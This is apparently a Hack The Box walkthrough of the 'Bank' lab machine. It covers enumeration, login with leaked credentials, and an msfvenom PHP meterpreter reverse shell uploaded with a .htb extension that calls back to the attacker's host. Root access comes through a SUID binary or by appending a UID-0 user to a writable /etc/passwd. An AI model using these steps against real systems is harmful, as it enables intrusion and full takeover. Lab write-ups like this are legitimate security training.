# Enumeration

```
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.29
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 12:29 +08
Nmap scan report for 10.10.10.29
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/29%OT=22%CT=1%CU=33679%PV=Y%DS=2%DC=T%G=Y%TM=60B1C34
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   177.29 ms 10.10.14.1
2   177.79 ms 10.10.10.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.18 seconds
```

# Website

![c518677787c99cdbaf00ae5364e2671b.png](HomePage.png)
Seems like we need to add the hostname to our `/etc/hosts/` file

```
┌──(root💀Shiro)-[/home/shiro]
└─# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Shiro.Blank	Shiro
10.10.10.29	bank.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, we should be able to view the website.

![Login.png](Login.png)

Let's run `gobuster` to brute force the possible URLs in the website (use flag `-x php` because the website is running php).

```
┌──(root💀Shiro)-[/home/shiro]
└─# gobuster dir --url http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bank.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/01 06:34:48 Starting gobuster
===============================================================
/support.php (Status: 302)
/uploads (Status: 301)
/assets (Status: 301)
/logout.php (Status: 302)
/login.php (Status: 200)
/index.php (Status: 302)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
===============================================================
2020/07/01 06:38:34 Finished
===============================================================
```

Lets visit the `/balance-transfer/` page and sort it
![BalanceTransfer.png](BalanceTransfer.png)
We notice that there is one file that has a smaller size compared to others
![InterestingFile.png](InterestingFile.png)
Now lets use this credentials to log in.
![Dashboard.png](Dashboard.png)
![Dashboard_2.png](Dashboard_2.png)
Inspecting the page source shows that we should use htb extensions
![PageSource.png](PageSource.png)
Now lets generate a reverse php shell with `.htb` extension using msfvenom.

```
Google "php reverse shell meterpreter"
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Bank]
└─# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f raw > exploit.htb
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1111 bytes
```

Then we upload the file to the website and start msfconsole and then execute the php file.

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > set AUTORUNSCRIPT post/windows/manage/migrate
AUTORUNSCRIPT => post/windows/manage/migrate
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:1234
[*] Sending stage (39282 bytes) to 10.10.10.29
[*] Session ID 1 (10.10.14.2:1234 -> 10.10.10.29:35630) processing AutoRunScript 'post/windows/manage/migrate'
[!] SESSION may not be compatible with this module (incompatible session platform: linux)
[*] Running module against bank
[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_attach: Operation failed: The command is not supported by this Meterpreter type (php/linux)
[-] Call stack:
[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:213:in `send_packet_wait_response'
[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:97:in `_open'
[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:78:in `open'
[-]   /usr/share/metasploit-framework/modules/post/windows/manage/migrate.rb:40:in `run'
[*] Meterpreter session 1 opened (10.10.14.2:1234 -> 10.10.10.29:35630) at 2021-05-29 14:54:01 +0800

meterpreter > shell
Process 1512 created.
Channel 0 created.
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")' # https://netsec.ws/?p=337
www-data@bank:/var/www/bank/uploads$
```

# Privilege Escalation

Lets search for all SUID binaries owned by root.

-   search all subdirectories of `/` (the entire file system)
-   `type f` - only return files
-   `user root` - only return files owned by root
-   `perm -4000` - files with SUID bit set
-   `2>/dev/null` - don't show errors

```
www-data@bank:/var/www/bank/uploads$ find / -type f -user root -perm -4000 2>/dev/null
</uploads$ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

We found an interesting `/var/htb/bin/emergency` so lets try to run it

```
www-data@bank:/var/www/bank/uploads$ /var/htb/bin/emergency
/var/htb/bin/emergency
#

# whoami
whoami
root
# cat /home/chris/user.txt
cat /home/chris/user.txt
c81ee9df3751ccf82b64af3046a3269a
# cat /root/root.txt
cat /root/root.txt
e92b13e6ff0dd9361add88e07b6687c9
```

# Alternative Privilege Escalation

Another way of getting root is to exploit the writeable `passwd` folder.

```
# ls -l /etc/passwd /etc/shadow 				Note that -1 will generate a MD5 password, -5 a SHA256 and -6 SHA512
ls -l /etc/passwd /etc/shadow
-rw-rw-rw- 1 root root   1252 May 28  2017 /etc/passwd
-rw-r----- 1 root shadow  895 Jun 14  2017 /etc/shadow
```

Then, generate a password hash for the password “shiro” using openssl

```
# openssl passwd -1 shiro
openssl passwd -1 shiro
$1$pOJIRjNf$gJAUfsAmmuY1XUuud4ink/
```

Then add a line to `/etc/passwd` using echo in this format

-   `username:password:userid:groupid:comment:homedirectory:shell`

```
# echo 'shiro:$1$pOJIRjNf$gJAUfsAmmuY1XUuud4ink/:0:0:pwned:/root:/bin/bash' >> /etc/passwd
echo 'shiro:$1$pOJIRjNf$gJAUfsAmmuY1XUuud4ink/:0:0:pwned:/root:/bin/bash' >> /etc/passwd
# su - shiro
su - shiro
Password: shiro

root@bank:~#
```